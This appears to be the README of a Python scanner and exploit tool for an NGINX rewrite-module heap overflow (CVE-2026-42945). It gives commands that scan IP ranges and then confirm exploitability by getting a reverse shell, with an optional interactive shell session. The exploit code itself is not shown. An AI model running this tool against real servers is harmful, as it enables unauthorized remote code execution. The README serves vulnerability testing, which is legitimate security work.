# NGINX Rift Scanner

Multi-threaded scanner for **CVE-2026-42945** (NGINX Rift): a heap buffer overflow in `ngx_http_rewrite_module` when `rewrite` (replacement containing `?`) and `set $var $capture` are used in the same location.

Stdlib only — no extra Python packages.

## Requirements

- Python 3.12+
- Authorized targets only

## Quick start

```bash
# Fingerprint scan (no exploit)
python3 scan.py 10.0.0.0/24 -o report.json

# Fingerprint + reverse-shell validation (confirms exploitability)
python3 scan.py 127.0.0.1 --listen-ip host.docker.internal --listen-port 4444

# Same + interactive shell and printed payload
python3 scan.py 127.0.0.1 --shell --listen-ip host.docker.internal --listen-port 4444
```

## Target formats

| Format | Example |
|--------|---------|
| Single IP | `192.168.1.10` |
| CIDR | `10.0.0.0/24` |
| Range | `10.0.0.1-10.0.0.50` |

## Usage

```
python3 scan.py <target> [options]
```

### Main options

| Option | Description |
|--------|-------------|
| `--listen-ip`, `--lhost` | Callback host the target connects to (IPv4 or hostname) |
| `--listen-port`, `--lport` | Callback port for reverse-shell validation |
| `--shell` | Interactive shell session + print payload command |
| `--ports` | Ports to scan (default: `80,443,19321`) |
| `--exploit-port` | Nginx exploit port if different from scanned port |
| `-o`, `--output` | Report file (default: `scan_report.json`) |
| `--threads` | Worker threads (default: `50`) |
| `-q`, `--quiet` | Less console output |

### Modes

**1. Fingerprint only** — no `--listen-ip` / `--listen-port`

- Checks nginx version (CVE range)
- Probes for `/api/` + `/spray` PoC layout and rewrite+set heuristics
- Writes vulnerable hosts to the report

**2. Reverse-shell validation** — with `--listen-ip` and `--listen-port`

- Runs phase 1, then runs the PoC-style exploit
- Listens on `0.0.0.0:<listen-port>`
- Marks `confirmed_vulnerable` only if a reverse shell connects back
- Does not print payload or open an interactive session unless `--shell` is set

**3. Interactive shell** — add `--shell`

- Same as mode 2, plus prints the exact scan command and payload
- Drops into a terminal relay on success (Ctrl+C to exit)

## Report

Only **vulnerable** hosts are saved. Console summary:

```text
[*] Vulnerable: 2
[+] scan_report.json
```

Example `scan_report.json`:

```json
{
  "cve": "CVE-2026-42945",
  "target": "10.0.0.0/24",
  "scanned_at": "2026-05-16T12:00:00+00:00",
  "total_vulnerable": 1,
  "vulnerable": [
    {
      "ip": "127.0.0.1",
      "port": 19321,
      "status": "confirmed_vulnerable",
      "nginx_version": "1.31.0",
      "confirmed": true,
      "shell_peer": "172.18.0.1:54321"
    }
  ]
}
```

### Status values

| Status | Meaning |
|--------|---------|
| `vulnerable_version` | Nginx version in CVE range; config not fully confirmed |
| `possibly_vulnerable` | Weak version/config signals |
| `likely_vulnerable` | Strong config signal (e.g. `/api/` + `/spray` layout) |
| `confirmed_vulnerable` | Reverse shell received during validation |

## Docker lab example

When nginx runs in Docker and your listener is on the host:

```bash
python3 scan.py 127.0.0.1 --ports 19321 \
  --listen-ip host.docker.internal \
  --listen-port 4444
```

With interactive shell:

```bash
python3 scan.py 127.0.0.1 --ports 19321 --shell \
  --listen-ip host.docker.internal \
  --listen-port 4444
```

## Exploit validation limits

Reverse-shell validation uses fixed heap/libc offsets from the PoC lab (**ASLR disabled**). It requires nginx locations like:

- `location ~ ^/api/(.*)$` with `rewrite` + `set`
- `location /spray` for heap spray

Most production sites on 80/443 will fingerprint by version only; exploit confirmation applies to matching lab or custom PoC configs.

## Project layout

```
scan.py              # CLI entry point
scanner/
  cli.py             # Arguments and validation
  engine.py          # Scan orchestration
  http.py            # HTTP/TLS probes
  version.py         # Version and classification
  exploit.py         # PoC exploit + shell listener
  targets.py         # IP range parsing
  constants.py       # CVE ranges and defaults
```

## Affected versions (reference)

| Product | Affected | Fixed in |
|---------|----------|----------|
| NGINX Open Source | 0.6.27 – 1.30.0 | 1.30.1, 1.31.0+ |

Lab images may report `nginx/1.31.0` while still exposing the vulnerable rewrite+set configuration; the scanner treats confirmed `/api/` + `/spray` layout as `likely_vulnerable` regardless of the banner.

## Legal

Use only on systems you own or have explicit permission to test. Unauthorized scanning or exploitation is illegal.
